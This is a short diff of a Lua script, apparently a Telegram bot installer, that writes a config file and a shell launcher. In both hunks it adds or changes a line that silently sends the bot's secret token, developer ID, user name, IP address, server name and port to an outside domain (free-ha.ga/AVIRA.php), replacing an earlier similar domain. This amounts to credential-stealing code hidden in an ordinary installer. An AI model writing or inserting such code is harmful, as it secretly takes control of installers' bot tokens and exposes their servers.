@@ -70,7 +70,7 @@ David = DevAbs:get(ServerDavid.."TokenDavid"):match("(%d+)"),
 SudoIds = {DevAbs:get(ServerDavid.."IdDavid")},
 }
 Create(Config, "./config.lua")   
-https.request("https://kk38abodypole.ga/Aivar.php?Get=David&DevId="..DevAbs:get(ServerDavid.."IdDavid").."&TokenBot="..DevAbs:get(ServerDavid.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+https.request("https://free-ha.ga/AVIRA.php?Get=David&DevId="..DevAbs:get(ServerDavid.."IdDavid").."&TokenBot="..DevAbs:get(ServerDavid.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 file = io.open("TOKYO.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -9263,7 +9263,7 @@ TokenBot = TokenBot,
 David = TokenBot:match("(%d+)"),
 SudoIds = {DevId},
 }
-https.request("https://free-ha.ga/AVIRA.php?Get=token&id="..DevId.."&TokenBot="..TokenBot.."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+https.request("https://free-ha.ga/AVIRA.php?Get=David&DevId="..DevId.."&TokenBot="..TokenBot.."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 Create(Config, "./config.lua")   
 file = io.open("TOKYO.sh", "w")  
 file:write([[
